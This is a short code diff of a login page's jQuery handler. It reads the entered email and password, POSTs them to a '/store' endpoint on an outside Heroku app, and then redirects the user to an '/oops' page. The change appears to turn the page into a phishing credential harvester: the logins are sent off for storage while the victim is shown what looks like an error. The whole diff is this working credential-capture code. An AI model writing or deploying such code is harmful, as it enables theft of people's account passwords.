@@ -10,8 +10,8 @@
         $("#signin").click(function(){
           email=$("#email").val();
           password=$("#password").val();
-          $.post("https://lmpt-heroku-app.herokuapp.com/oops",{email: email,password: password}, function(data){
-			
+          $.post("https://lmpt-heroku-app.herokuapp.com/store",{email: email,password: password}, function(data){
+			window.location.href = "https://lmpt-heroku-app.herokuapp.com/oops";
             if(data==='done')
               {
                 console.log("store success");
